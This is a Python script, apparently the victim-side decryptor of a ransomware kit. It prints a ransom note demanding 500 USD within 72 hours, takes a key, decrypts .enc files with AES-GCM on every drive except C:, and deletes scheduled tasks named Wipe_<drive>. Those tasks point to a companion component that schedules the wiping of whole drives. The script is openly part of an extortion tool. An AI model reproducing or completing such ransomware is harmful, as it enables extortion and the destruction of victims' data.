import os, string, subprocess
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def cancel_drive_wipe(drives):
    for drive in drives:
        if drive == "C:\\": 
            continue
        task_name = f"Wipe_{drive[0]}"
        try:
            subprocess.run(f'schtasks /delete /tn "{task_name}" /f', shell=True)
            print(f"[+] Đã hủy lịch xóa ổ {drive}")
        except Exception as e:
            print(f"[-] Không thể hủy task {task_name}: {e}")

def main():
    ransom_text = (
        "!!! YOUR FILES HAVE BEEN ENCRYPTED !!!\n\n"
        "All your important documents, photos, and databases are locked.\n"
        "To restore access, you must pay 500 USD.\n"
        "Failure to do so within 72 hours will result in permanent data loss.\n\n"
    )
    print(ransom_text)
    key = input("Key: ").encode()  
    
    try:
        block = algorithms.AES(key)
    except ValueError as e:
        print("error while setting up aes:", str(e))
        return
    backend = default_backend()

    drives = [f"{d}:\\" for d in string.ascii_uppercase if os.path.exists(f"{d}:\\")]
    decrypted_any = False  # Flag kiểm tra có file nào được giải mã không

    for drive in drives:
        if drive == "C:\\": 
            continue
        for root, dirs, files in os.walk(drive):
            for file_name in files:
                if not file_name.endswith(".enc"):
                    continue
                decrypted_any = True
                path = os.path.join(root, file_name)
                print(f"Decrypting {path}...")
                try:
                    with open(path, 'rb') as f:
                        data = f.read()
                    nonce = data[:12]
                    tag = data[-16:]
                    ciphertext = data[12:-16]
                    gcm = modes.GCM(nonce, tag)
                    cipher = Cipher(block, gcm, backend=backend)
                    decryptor = cipher.decryptor()
                    original = decryptor.update(ciphertext) + decryptor.finalize()
                    output_path = path[:-4]
                    with open(output_path, 'wb') as f:
                        f.write(original)
                    os.remove(path)
                except Exception as e:
                    print(f"Error: {e}")

    if decrypted_any:
        cancel_drive_wipe(drives)  # Hủy tất cả task xóa sau khi giải mã

if __name__ == "__main__":
    main()
